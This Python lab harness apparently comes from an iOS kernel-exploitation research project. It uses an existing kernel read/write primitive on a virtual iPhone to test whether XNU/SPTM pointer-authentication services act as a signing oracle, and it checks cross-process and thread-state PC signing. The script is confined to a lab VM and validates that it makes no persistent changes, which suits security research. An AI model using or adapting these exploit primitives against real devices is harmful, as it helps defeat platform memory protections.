#!/usr/bin/env python3
"""Run the exact, non-mutating XNU-to-SPTM PAC round-trip probe."""

from __future__ import annotations

import argparse
import json
import re
import secrets
import shlex
import subprocess
import time
from pathlib import Path
from typing import Any

from cnd_remotecall_lab import DEFAULT_KNOWN_HOSTS, LabError, SSH, require_vphone
from cnd_rea_secure_execution import (
    _require_profile_identity,
    load_bundle,
    load_observation_profile,
    sha256,
    verify_bundle,
    write_json,
)
from cnd_vphone_krw import (
    PROBE_SOURCE,
    build_binary,
    copy_binary,
    current_cyanide,
    parse_marker,
    provider_processes,
    run_kcall_smoke,
)


REPO_ROOT = Path(__file__).resolve().parents[2]
PAC_PROBE_SOURCE = REPO_ROOT / "scripts/lab/cnd_sptm_pac_probe.c"
PROCESS_PROBE_SOURCE = REPO_ROOT / "scripts/lab/cnd_sptm_pac_process_probe.c"
INTEGRATION_PROBE_SOURCE = (
    REPO_ROOT / "scripts/lab/cnd_lab_pac_integration_probe.c"
)
LAB_PAC_SOURCE = REPO_ROOT / "Cyanide/kexploit/CNDLabKernelPAC.m"
DEFAULT_MANIFEST = (
    REPO_ROOT / "build/rea-secure-execution-23A341-iphone17,3/bundle.json"
)
DEFAULT_PROFILE = (
    REPO_ROOT / "scripts/lab/profiles/"
    "rea-secure-execution-23A341-iphone17,3-trustcache.json"
)


def hex64(value: Any, name: str) -> int:
    if not isinstance(value, str) or not re.fullmatch(
            r"0x[0-9a-f]{16}", value):
        raise LabError(f"PAC probe returned invalid {name}")
    return int(value, 16)


def expected_provider_base(bundle: dict[str, Any], profile: dict[str, Any],
                           runtime: dict[str, Any]) -> int:
    try:
        static_inner = int(
            bundle["artifacts"]["kernel"]["macho"]["text_address"], 16)
        static_fileset = int(
            profile["dispatch_abi"]["kernel_fileset_static_base"], 16)
        live_inner = int(runtime["load_address"], 16)
    except (KeyError, TypeError, ValueError) as error:
        raise LabError("kernel fileset/inner-text binding is malformed") from error
    offset = profile["dispatch_abi"].get("kernel_inner_text_offset")
    if not isinstance(offset, int) or isinstance(offset, bool) or \
            offset != static_inner - static_fileset or offset != 0x4000:
        raise LabError("kernel fileset/inner-text offset is not exact")
    if live_inner < offset:
        raise LabError("live inner kernel text precedes fileset base")
    return live_inner - offset


def validate_probe_result(value: Any, bundle: dict[str, Any],
                          profile: dict[str, Any],
                          runtime: dict[str, Any]) -> dict[str, Any]:
    if not isinstance(value, dict) or \
            value.get("schema") != "com.zeroxjf.cyanide.sptm-pac-probe" or \
            value.get("schema_version") != 1 or \
            value.get("persistent_mutation") is not False:
        raise LabError("PAC probe returned an unsupported result")
    pointer = hex64(value.get("pointer"), "pointer")
    discriminator = hex64(value.get("discriminator"), "discriminator")
    provider_base = hex64(value.get("kernel_base"), "kernel_base")
    slide = int(runtime["slide"], 16)
    if provider_base != expected_provider_base(bundle, profile, runtime) or \
            value.get("slide") != f"0x{slide:x}":
        raise LabError("PAC probe result does not match the verified live kernel")
    services = {
        item.get("selector"): item for item in profile.get("sptm_services", [])
        if isinstance(item, dict)
    }
    try:
        sign_static = int(services[16]["kernel_stub"], 16)
        auth_static = int(services[17]["kernel_stub"], 16)
        pmap_sign_static = int(
            services[16]["kernel_context_wrapper"], 16)
        pmap_auth_static = int(
            services[17]["kernel_context_wrapper"], 16)
    except (KeyError, TypeError, ValueError) as error:
        raise LabError("profile has no exact sign/auth service stubs") from error
    if hex64(value.get("sign_stub"), "sign_stub") != sign_static + slide or \
            hex64(value.get("auth_stub"), "auth_stub") != auth_static + slide or \
            hex64(value.get("pmap_sign_wrapper"), "pmap_sign_wrapper") != \
            pmap_sign_static + slide or \
            hex64(value.get("pmap_auth_wrapper"), "pmap_auth_wrapper") != \
            pmap_auth_static + slide:
        raise LabError("PAC probe used a different live XNU service stub")
    signed_ia = hex64(value.get("key_0_signed"), "key_0_signed")
    signed_da = hex64(value.get("key_2_signed"), "key_2_signed")
    authenticated_ia = hex64(
        value.get("key_0_authenticated"), "key_0_authenticated")
    authenticated_da = hex64(
        value.get("key_2_authenticated"), "key_2_authenticated")
    rejected = hex64(
        value.get("wrong_discriminator_result"),
        "wrong_discriminator_result",
    )
    if pointer != 0x100000000 or discriminator != 0x434E44 or \
            signed_ia == pointer or signed_da == pointer or \
            authenticated_ia != pointer or authenticated_da != pointer or \
            rejected != 0xffffffffffffffff:
        raise LabError("PAC probe round-trip invariants failed")
    jop_a = hex64(value.get("explicit_jop_key_a"), "explicit_jop_key_a")
    jop_b = hex64(value.get("explicit_jop_key_b"), "explicit_jop_key_b")
    signed_a = hex64(
        value.get("explicit_jop_key_a_signed"),
        "explicit_jop_key_a_signed",
    )
    signed_b = hex64(
        value.get("explicit_jop_key_b_signed"),
        "explicit_jop_key_b_signed",
    )
    authenticated_a = hex64(
        value.get("explicit_jop_key_a_authenticated"),
        "explicit_jop_key_a_authenticated",
    )
    wrong_key = hex64(
        value.get("key_a_signature_auth_with_key_b"),
        "key_a_signature_auth_with_key_b",
    )
    if jop_a != 0x434e440100000001 or jop_b != 0x434e440200000001 or \
            signed_a == pointer or signed_b == pointer or signed_a == signed_b or \
            authenticated_a != pointer or wrong_key == pointer:
        raise LabError("explicit JOP-context PAC invariants failed")
    return value


def validate_process_result(value: Any, mode: str,
                            expected_signatures: tuple[int, int] | None = None
                            ) -> dict[str, Any]:
    if not isinstance(value, dict) or \
            value.get("schema") != \
            "com.zeroxjf.cyanide.sptm-pac-process-probe" or \
            value.get("schema_version") != 1 or value.get("mode") != mode or \
            value.get("persistent_mutation") is not False:
        raise LabError("process PAC probe returned an unsupported result")
    key0 = hex64(value.get("key_0_signature"), "process key_0_signature")
    key2 = hex64(value.get("key_2_signature"), "process key_2_signature")
    auth0 = hex64(value.get("key_0_auth_result"), "process key_0_auth_result")
    auth2 = hex64(value.get("key_2_auth_result"), "process key_2_auth_result")
    if mode == "sign" and (
        key0 == 0x100000000 or key2 == 0x100000000 or
        auth0 != 0x100000000 or auth2 != 0x100000000
    ):
        raise LabError("process-local PAC round-trip invariants failed")
    if expected_signatures is not None and (key0, key2) != expected_signatures:
        raise LabError("cross-process PAC probe changed supplied signatures")
    return value


def validate_thread_state_result(value: Any) -> dict[str, Any]:
    if not isinstance(value, dict) or \
            value.get("schema") != \
            "com.zeroxjf.cyanide.sptm-pac-process-probe" or \
            value.get("schema_version") != 1 or \
            value.get("mode") != "thread-state" or \
            value.get("persistent_mutation") is not False or \
            not isinstance(
                value.get("raw_selector_matches_thread_state"), bool):
        raise LabError("thread-state PAC probe returned an unsupported result")
    flags = value.get("thread_state_flags")
    if not isinstance(flags, str) or not re.fullmatch(r"0x[0-9a-f]{8}", flags):
        raise LabError("thread-state PAC probe returned invalid flags")
    signed_pc = hex64(
        value.get("thread_state_signed_pc"), "thread-state signed PC")
    raw_pc = hex64(value.get("thread_state_raw_pc"), "thread-state raw PC")
    api_pc = hex64(
        value.get("thread_state_api_authenticated_pc"),
        "thread-state API-authenticated PC",
    )
    worker_start = hex64(
        value.get("worker_start"), "thread-state worker start")
    kernel_thread = hex64(
        value.get("kernel_thread"), "thread-state kernel thread")
    current_thread_stub = hex64(
        value.get("current_thread_stub"), "current-thread stub")
    discriminator = hex64(
        value.get("pc_discriminator"), "thread-state PC discriminator")
    sptm_pc = hex64(value.get("sptm_signed_pc"), "thread-state SPTM PC")
    authenticated_pc = hex64(
        value.get("sptm_authenticated_pc"),
        "thread-state authenticated PC",
    )
    parsed_flags = int(flags, 16)
    if signed_pc == raw_pc or api_pc != raw_pc or \
            authenticated_pc != raw_pc or discriminator != \
            0x0000000000007481 or parsed_flags & 1 or not parsed_flags & 4 or \
            not worker_start <= raw_pc < worker_start + 0x1000 or \
            kernel_thread & 0xffff000000000000 != 0xffff000000000000 or \
            current_thread_stub & 0xffff000000000000 != 0xffff000000000000:
        raise LabError("thread-state PAC consumer invariants failed")
    return value


def validate_target_context_result(
        value: Any, thread_state: dict[str, Any],
        probe: dict[str, Any], profile: dict[str, Any]) -> dict[str, Any]:
    if not isinstance(value, dict) or value.get("schema") != \
            "com.zeroxjf.cyanide.sptm-pac-target-context-probe" or \
            value.get("schema_version") != 1 or \
            value.get("persistent_mutation") is not False or \
            value.get("exact_match") is not True:
        raise LabError("target-context PAC probe returned an unsupported result")
    kernel_thread = hex64(
        value.get("kernel_thread"), "target-context kernel thread")
    jop_offset = hex64(
        value.get("thread_jop_pid_offset"), "thread jop_pid offset")
    jop_pid = hex64(value.get("jop_pid"), "target-context jop_pid")
    raw_pc = hex64(value.get("raw_pc"), "target-context raw PC")
    expected_signed_pc = hex64(
        value.get("expected_signed_pc"), "target-context expected signed PC")
    context_signed_pc = hex64(
        value.get("context_signed_pc"), "target-context signed PC")
    context_authenticated_pc = hex64(
        value.get("context_authenticated_pc"),
        "target-context authenticated PC",
    )
    current_thread_stub = hex64(
        value.get("current_thread_stub"), "target-context current-thread stub")
    pmap_sign = hex64(
        value.get("pmap_sign_wrapper"), "target-context pmap sign wrapper")
    pmap_auth = hex64(
        value.get("pmap_auth_wrapper"), "target-context pmap auth wrapper")
    consumer = profile.get("thread_state_consumer")
    try:
        expected_jop_offset = consumer["machine_jop_pid_offset"]
        expected_discriminator = int(consumer["pc_discriminator"], 16)
        expected_current_thread = (
            int(consumer["current_thread_accessor"], 16) +
            int(probe["slide"], 16)
        )
    except (KeyError, TypeError, ValueError) as error:
        raise LabError("profile has no exact thread-state consumer") from error
    if not isinstance(expected_jop_offset, int) or \
            isinstance(expected_jop_offset, bool) or \
            jop_offset != expected_jop_offset or \
            hex64(
                thread_state.get("pc_discriminator"),
                "thread-state PC discriminator",
            ) != expected_discriminator or \
            current_thread_stub != expected_current_thread or \
            kernel_thread != hex64(
                thread_state.get("kernel_thread"), "thread-state kernel thread") or \
            raw_pc != hex64(
                thread_state.get("thread_state_raw_pc"), "thread-state raw PC") or \
            expected_signed_pc != hex64(
                thread_state.get("thread_state_signed_pc"),
                "thread-state signed PC",
            ) or context_signed_pc != expected_signed_pc or \
            context_authenticated_pc != raw_pc or \
            current_thread_stub != hex64(
                thread_state.get("current_thread_stub"),
                "thread-state current-thread stub",
            ) or pmap_sign != hex64(
                probe.get("pmap_sign_wrapper"), "PAC probe pmap sign wrapper") or \
            pmap_auth != hex64(
                probe.get("pmap_auth_wrapper"), "PAC probe pmap auth wrapper"):
        raise LabError("target-context PAC equivalence invariants failed")
    return value


def validate_integration_result(
        value: Any, marker: dict[str, str], provider_base: int,
        probe: dict[str, Any], profile: dict[str, Any]) -> dict[str, Any]:
    if not isinstance(value, dict) or value.get("schema") != \
            "com.zeroxjf.cyanide.lab-pac-integration-probe" or \
            value.get("schema_version") != 1 or \
            value.get("persistent_mutation") is not False or \
            value.get("exact_consumer_match") is not True:
        raise LabError("lab PAC integration returned an unsupported result")
    consumer = profile.get("thread_state_consumer")
    identity = profile.get("identity")
    if not isinstance(consumer, dict) or not isinstance(identity, dict):
        raise LabError("PAC profile has no identity-bound thread consumer")
    expected_offset = consumer.get("machine_jop_pid_offset")
    if not isinstance(expected_offset, int) or isinstance(expected_offset, bool):
        raise LabError("PAC profile has an invalid JOP PID offset")
    if value.get("kernel_uuid") != identity.get("kernel_uuid") or \
            hex64(value.get("kernel_base"), "integration kernel base") != \
            provider_base or \
            hex64(value.get("kernel_thread"), "integration kernel thread") != \
            hex64(marker["kernel_thread"], "marker kernel thread") or \
            hex64(value.get("thread_jop_pid_offset"),
                  "integration JOP PID offset") != expected_offset or \
            hex64(value.get("raw_pc"), "integration raw PC") != \
            hex64(marker["raw_pc"], "marker raw PC") or \
            hex64(value.get("expected_signed_pc"),
                  "integration signed PC") != \
            hex64(marker["signed_pc"], "marker signed PC") or \
            hex64(value.get("pmap_sign_wrapper"),
                  "integration pmap sign wrapper") != \
            hex64(probe["pmap_sign_wrapper"], "probe pmap sign wrapper") or \
            hex64(value.get("pmap_auth_wrapper"),
                  "integration pmap auth wrapper") != \
            hex64(probe["pmap_auth_wrapper"], "probe pmap auth wrapper"):
        raise LabError("lab PAC integration does not match the exact consumer")
    hex64(value.get("jop_pid"), "integration JOP PID")
    return value


def run_target_context_probe(
        ssh: SSH, process_remote: str, pac_remote: str,
        integration_remote: str, live_inner: str,
        socket_path: str, provider_base: int, probe: dict[str, Any],
        profile: dict[str, Any],
        hold_ms: int = 20000
        ) -> tuple[dict[str, Any], dict[str, Any], dict[str, Any]]:
    token = secrets.token_hex(8)
    ready_path = f"/var/tmp/cnd-sptm-pac-ready-{token}"
    command = (
        f"CND_PAC_PROBE_READY_PATH={shlex.quote(ready_path)} "
        f"CND_PAC_PROBE_DELAY_MS={hold_ms} "
        f"{shlex.quote(process_remote)} {shlex.quote(live_inner)} "
        "thread-state"
    )
    child = subprocess.Popen(
        [*ssh.base, command], env=ssh.environment,
        stdout=subprocess.PIPE, stderr=subprocess.PIPE,
    )
    marker: dict[str, str] | None = None
    deadline = time.monotonic() + 10
    while time.monotonic() < deadline:
        if ssh.file_kind(ready_path) == "file":
            marker = parse_marker(ssh.read_file(ready_path))
            break
        if child.poll() is not None:
            break
        time.sleep(0.2)
    if marker is None:
        stdout, stderr = child.communicate(timeout=hold_ms / 1000 + 5)
        detail = b"\n".join(part.strip() for part in (stdout, stderr) if part)
        raise LabError(
            "thread-state consumer did not publish its target context" +
            (f": {detail.decode('utf-8', 'replace')}" if detail else "")
        )
    if set(marker) != {
        "pid", "worker_start", "kernel_thread", "signed_pc", "raw_pc",
    } or not re.fullmatch(r"[1-9][0-9]*", marker["pid"]):
        raise LabError("thread-state target-context marker is malformed")
    for name in ("worker_start", "kernel_thread", "signed_pc", "raw_pc"):
        hex64(marker[name], f"target-context marker {name}")
    context_command = " ".join(shlex.quote(value) for value in (
        pac_remote, socket_path, f"0x{provider_base:016x}", "context",
        marker["kernel_thread"], marker["signed_pc"], marker["raw_pc"],
    ))
    context_output = ssh.command(context_command).strip()
    integration_command = " ".join(shlex.quote(value) for value in (
        integration_remote, socket_path, f"0x{provider_base:016x}",
        marker["kernel_thread"], marker["signed_pc"], marker["raw_pc"],
    ))
    integration_output = ssh.command(integration_command).strip()
    stdout, stderr = child.communicate(timeout=hold_ms / 1000 + 5)
    if child.returncode != 0:
        detail = b"\n".join(part.strip() for part in (stdout, stderr) if part)
        raise LabError(
            f"thread-state consumer failed ({child.returncode})" +
            (f": {detail.decode('utf-8', 'replace')}" if detail else "")
        )
    try:
        thread_state = validate_thread_state_result(
            json.loads(stdout.decode("utf-8", "replace")))
        context = json.loads(context_output)
        integration = json.loads(integration_output)
    except json.JSONDecodeError as error:
        raise LabError(
            "coordinated target-context probe did not return JSON") from error
    if marker["kernel_thread"] != thread_state["kernel_thread"] or \
            marker["signed_pc"] != thread_state["thread_state_signed_pc"] or \
            marker["raw_pc"] != thread_state["thread_state_raw_pc"]:
        raise LabError("target-context marker changed before process exit")
    return (
        thread_state,
        validate_target_context_result(
            context, thread_state, probe, profile),
        validate_integration_result(
            integration, marker, provider_base, probe, profile),
    )


def run_live(args: argparse.Namespace) -> dict[str, Any]:
    bundle = load_bundle(args.manifest)
    profile = load_observation_profile(args.profile)
    identity = _require_profile_identity(bundle, profile)
    verified = verify_bundle(bundle, args.kernel_debug_port)
    runtime = verified.get("runtime")
    if not isinstance(runtime, dict):
        raise LabError("PAC probe requires a debugger-verified live kernel")
    provider_base = expected_provider_base(bundle, profile, runtime)

    ssh = SSH(args.host, args.port, args.user, args.known_hosts,
              args.password_env)
    require_vphone(ssh)
    _, _, socket_path = current_cyanide(ssh)
    processes = provider_processes(ssh)
    marker = parse_marker(ssh.read_file("/var/tmp/cyanide-enable-libkrw-lab")) \
        if ssh.file_kind("/var/tmp/cyanide-enable-libkrw-lab") == "file" else {}
    if len(processes) != 1 or marker.get("socket") != socket_path:
        raise LabError("one exact armed vPhone KRW provider is required")

    smoke_local = build_binary(PROBE_SOURCE, "cnd_lab_krw_probe")
    pac_local = build_binary(PAC_PROBE_SOURCE, "cnd_sptm_pac_probe")
    process_local = build_binary(
        PROCESS_PROBE_SOURCE, "cnd_sptm_pac_process_probe",
        architecture="arm64e",
    )
    integration_local = build_binary(
        INTEGRATION_PROBE_SOURCE, "cnd_lab_pac_integration_probe",
        extra_sources=(LAB_PAC_SOURCE,),
    )
    smoke_remote = copy_binary(ssh, smoke_local, "cnd-lab-krw-probe")
    pac_remote = copy_binary(ssh, pac_local, "cnd-sptm-pac-probe")
    process_remote = copy_binary(
        ssh, process_local, "cnd-sptm-pac-process-probe")
    integration_remote = copy_binary(
        ssh, integration_local, "cnd-lab-pac-integration-probe")
    smoke = run_kcall_smoke(ssh, smoke_remote, socket_path)
    output = ssh.command(
        f"{shlex.quote(pac_remote)} {shlex.quote(socket_path)} "
        f"0x{provider_base:016x}"
    ).strip()
    try:
        probe = json.loads(output)
    except json.JSONDecodeError as error:
        raise LabError("PAC probe did not return one JSON object") from error
    validate_probe_result(probe, bundle, profile, runtime)
    live_inner = runtime["load_address"]

    def process_invoke(arguments: list[str]) -> dict[str, Any]:
        command = " ".join(shlex.quote(value) for value in (
            [process_remote, live_inner] + arguments
        ))
        try:
            value = json.loads(ssh.command(command))
        except json.JSONDecodeError as error:
            raise LabError(
                "process PAC probe did not return one JSON object") from error
        return value

    process_a = validate_process_result(process_invoke(["sign"]), "sign")
    process_b = validate_process_result(process_invoke(["sign"]), "sign")
    signatures_a = (
        hex64(process_a["key_0_signature"], "process-a key 0"),
        hex64(process_a["key_2_signature"], "process-a key 2"),
    )
    process_c = validate_process_result(process_invoke([
        "auth", process_a["key_0_signature"], process_a["key_2_signature"],
    ]), "auth", signatures_a)
    thread_state_consumer, target_context, lab_pac_integration = \
        run_target_context_probe(
            ssh, process_remote, pac_remote, integration_remote,
            live_inner, socket_path, provider_base, probe, profile,
        )
    same_signatures = {
        "key_0": process_a["key_0_signature"] == process_b["key_0_signature"],
        "key_2": process_a["key_2_signature"] == process_b["key_2_signature"],
    }
    cross_auth = {
        "key_0": process_c["key_0_auth_result"] != "0xffffffffffffffff",
        "key_2": process_c["key_2_auth_result"] != "0xffffffffffffffff",
    }
    process_scoped = not any(same_signatures.values()) and \
        not any(cross_auth.values())
    process_scope = {
        "classification": "runtime-observed",
        "process_a": process_a,
        "process_b": process_b,
        "process_c_authenticates_process_a": process_c,
        "same_signature_across_processes": same_signatures,
        "cross_process_authentication": cross_auth,
        "conclusion": (
            "Observed IA/DA signatures are process-context-bound."
            if process_scoped else
            "Observed results do not establish strict process-context scope."
        ),
    }
    return {
        "schema": "com.zeroxjf.cyanide.sptm-pac-runtime-observation",
        "schema_version": 1,
        "classification": "runtime-observed",
        "identity": identity,
        "runtime": runtime,
        "kernel_call_smoke": smoke,
        "probe_sha256": sha256(pac_local),
        "process_probe_sha256": sha256(process_local),
        "integration_probe_sha256": sha256(integration_local),
        "probe": probe,
        "process_scope": process_scope,
        "thread_state_consumer": {
            "classification": "runtime-observed",
            "result": thread_state_consumer,
            "target_context": target_context,
            "conclusion": (
                "The live arm64e thread_get_state path returns a valid "
                "kernel-signed PC. Reading the exact target thread's "
                "machine.jop_pid "
                "and supplying it through the pmap wrapper exactly "
                "reproduces and authenticates that signed PC."
            ),
        },
        "lab_krw_pac_integration": {
            "classification": "runtime-observed",
            "result": lab_pac_integration,
            "conclusion": (
                "The Cyanide VM-only PAC adapter resolved the exact live "
                "kernel identity and reproduced the normal thread-state "
                "consumer through the existing lab KRW transport."
            ),
        },
        "conclusion": (
            "Exact XNU selectors 0x10/0x11 provide live IA/DA user-pointer "
            "sign/auth round trips; pmap wrappers select an explicit JOP key; "
            "a wrong discriminator returns UINT64_MAX; and the IA result "
            "under the target thread's jop_pid exactly matches the kernel's "
            "normal thread-state PC consumer."
        ),
        "limits": {
            "establishes_user_pointer_pac_oracle": True,
            "establishes_explicit_jop_context_selection": True,
            "oracle_is_process_context_bound": process_scoped,
            "establishes_thread_state_pc_consumer": True,
            "establishes_target_jop_context_equivalence": True,
            "establishes_lab_krw_pac_adapter": True,
            "establishes_arbitrary_kernel_pointer_signing": False,
            "establishes_sptm_write_primitive": False,
            "persistent_mutation": False,
        },
    }


def parser() -> argparse.ArgumentParser:
    result = argparse.ArgumentParser(description=__doc__)
    result.add_argument("--host", required=True)
    result.add_argument("--port", type=int, default=22222)
    result.add_argument("--user", default="root")
    result.add_argument("--known-hosts", type=Path, default=DEFAULT_KNOWN_HOSTS)
    result.add_argument("--password-env", default="CND_VPHONE_ROOT_PASSWORD")
    result.add_argument("--kernel-debug-port", type=int, required=True)
    result.add_argument("--manifest", type=Path, default=DEFAULT_MANIFEST)
    result.add_argument("--profile", type=Path, default=DEFAULT_PROFILE)
    result.add_argument("--output", type=Path)
    return result


def main() -> int:
    args = parser().parse_args()
    if args.port != 22222 or args.user != "root":
        raise LabError("refusing: this harness requires root on SSH port 22222")
    write_json(args.output, run_live(args))
    return 0


if __name__ == "__main__":
    try:
        raise SystemExit(main())
    except LabError as error:
        print(f"error: {error}", file=__import__("sys").stderr)
        raise SystemExit(1)
